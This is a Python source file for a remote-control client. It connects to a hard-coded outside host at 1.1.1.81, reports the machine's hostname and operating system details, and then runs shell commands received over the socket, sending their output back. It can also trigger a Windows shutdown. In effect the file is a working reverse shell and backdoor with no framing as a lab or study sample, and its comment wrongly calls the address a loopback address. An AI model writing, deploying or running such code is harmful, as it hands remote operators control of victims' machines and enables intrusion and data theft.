import socket
import time
import platform
import json
import os
import subprocess
# Define host and port
HOST = '1.1.1.81' # Loopback address for localhost|
PORT = 12345        # Same port number as server

def handle_received_mesage(received_data):
    try:
        if received_data['source'] =="super":
            shutdown=received_data['data']['shutdown']
            shell=received_data['data']['shell']
            message=received_data['data']['message']
            if shell:
                command=message
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    print("Command executed successfully:")
                    return result.stdout
                else:
                    print("Error executing command:")
                    return result.stderr
                # output = subprocess.check_output(message.split(),shell=True)
                # return output.decode()
            if shutdown:
                os.system("shutdown /s /t 500")
                return "command Executed"
            else:
                return "Empty"
        else:
            return False
    except Exception as e:
        print(e)
        return False
# Create a socket object
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    # Connect to the server
    client_socket.connect((HOST, PORT))
    machine_name = socket.gethostname()
    system = platform.system()
    release = platform.release()
    version = platform.version()
    
    message={"action":"connected","type":"client","data":{
        "Machine Name": machine_name,
        "Operating System": system,
        "OS Release": release,
        "OS Version": version
    }}
    
    client_socket.send(json.dumps(message).encode())
    
    while True:
        # Receive response from the server
        try:
                response = client_socket.recv(1024)
                message = response.decode()
                if message.lower() == 'exit':
                    break
                output=handle_received_mesage(json.loads(message))
                print(output,"details")
                if output:
                    data={
                        "action":"message",
                        "source":"client",
                        "target":"super",
                        "data":{
                            "message":output
                        }
                    }
                    client_socket.sendall(json.dumps(data).encode())
                time.sleep(1)
        except Exception as e:
            pass
       


